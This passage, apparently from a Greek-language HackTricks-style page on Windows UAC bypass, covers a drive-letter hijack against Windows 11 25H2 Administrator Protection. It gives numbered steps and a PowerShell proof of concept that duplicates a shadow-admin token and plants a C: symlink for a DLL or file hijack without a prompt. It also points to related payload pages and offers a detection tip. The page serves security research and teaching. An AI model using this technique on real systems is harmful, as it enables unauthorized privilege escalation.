- Συσχετίστε εκκινήσεις του `iscsicpl.exe` με μη αναμενόμενες child processes ή DLL loads εκτός των κανονικών καταλόγων των Windows.

### Νεότερη έρευνα που αξίζει να ελεγχθεί ξεχωριστά

Ορισμένα chains μετά το 2024 δεν μοιάζουν πλέον με τα κλασικά registry hijacks στο `HKCU\Software\Classes`. Για παράδειγμα, το activation-context cache poisoning μπορεί να συνδυάσει ένα **drive remap** και ένα **DLL redirection**, ώστε να μετακινηθεί από medium σε high integrity μέσω trusted UI / auto-elevated binaries, όπως το `ctfmon.exe`, και στη συνέχεια μέσω targets όπως το `fodhelper.exe`. Αντί να αντιγράψετε εδώ το μεγάλο PoC, ελέγξτε τα compact payload examples στο:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack γράμματος drive μέσω per-logon-session DOS device map στο Administrator Protection (25H2)

Για ολόκληρο το attack surface των `RAiLaunchAdminProcess` / UIAccess στο Windows 11 25H2, ελέγξτε τη dedicated σελίδα:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Το Windows 11 25H2 “Administrator Protection” χρησιμοποιεί shadow-admin tokens με per-session `\Sessions\0\DosDevices/<LUID>` maps. Ο κατάλογος δημιουργείται lazily από το `SeGetTokenDeviceMap` κατά το πρώτο `\??` resolution. Αν ο attacker κάνει impersonate το shadow-admin token μόνο σε **SecurityIdentification**, ο κατάλογος δημιουργείται με τον attacker ως **owner** (κληρονομεί το `CREATOR OWNER`), επιτρέποντας drive-letter links που έχουν precedence έναντι του `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Βήματα:**

1. Από μια low-privileged session, καλέστε το `RAiProcessRunOnce` για να κάνετε spawn ένα promptless shadow-admin `runonce.exe`.
2. Κάντε duplicate το primary token του σε token τύπου **identification** και κάντε impersonate σε αυτό κατά το άνοιγμα του `\??`, ώστε να εξαναγκάσετε τη δημιουργία του `\Sessions\0\DosDevices/<LUID>` με ownership του attacker.
3. Δημιουργήστε ένα `C:` symlink εκεί που να δείχνει σε storage υπό τον έλεγχο του attacker· οι επόμενες filesystem accesses σε εκείνη τη session θα κάνουν resolve το `C:` προς το path του attacker, επιτρέποντας DLL/file hijack χωρίς prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Αναφορές

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Πώς λειτουργεί το User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Συλλογή τεχνικών UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner συμβατότητας και launcher για UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – Το KONNI υιοθετεί AI για τη δημιουργία PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Εκμετάλλευση 0-Day εναντίον κυβερνητικών στόχων στη Νοτιοανατολική Ασία](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Παράκαμψη του Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC bypass με χρήση του SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
